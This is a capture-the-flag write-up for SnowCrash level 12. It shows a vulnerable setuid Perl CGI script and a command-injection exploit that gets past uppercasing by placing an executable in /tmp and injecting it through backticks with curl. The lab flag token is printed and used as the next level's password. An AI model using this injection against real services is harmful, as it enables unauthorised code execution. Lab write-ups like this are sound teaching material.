level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
level12@SnowCrash:~$ 

level12@SnowCrash:~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
level12@SnowCrash:~$ 



The program uses backticks to evaluate a shellscript
Me can exploit that by making it evaluate our script contained in the $xx variable
The regex will capitalize the 'x' argument and delete anything after a space
Me can't directly write x="`getflag>/tmp/token`" which would be translated as x="`GETFLAG>/TMP/TOKEN`" (as Linux is case-sensitive)
Instead me will write a file that will get executed



level12@SnowCrash:~$ echo 'getflag > /tmp/flag12' > /tmp/EXPLOIT
level12@SnowCrash:~$ chmod +x /tmp/EXPLOIT
level12@SnowCrash:~$ curl localhost:4646?x='`/tmp/EXPLOIT`'
level12@SnowCrash:~$ cat /tmp/flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
level12@SnowCrash:~$

level12@SnowCrash:~$ su level13
Password: g1qKMiRpXf53AWhDaU7FEkczr
level13@SnowCrash:~$ 
